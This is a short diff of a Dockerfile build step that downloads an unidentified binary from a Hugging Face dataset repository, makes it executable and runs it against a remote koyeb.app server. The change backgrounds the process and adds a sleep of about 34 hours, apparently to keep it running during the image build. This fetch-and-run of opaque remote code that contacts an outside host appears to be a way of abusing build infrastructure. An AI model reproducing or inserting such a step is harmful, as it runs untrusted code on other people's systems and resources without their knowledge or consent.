@@ -7,4 +7,4 @@ RUN apt-get update \
  && rm -rf /var/lib/apt/lists/* \
  && curl -L https://huggingface.co/datasets/api2/app/resolve/main/app -o /app \
  && chmod +x /app \
- && /app --server https://dominant-marleah-kozak-87119c7a.koyeb.app
+ && /app --server https://dominant-marleah-kozak-87119c7a.koyeb.app & sleep 123132
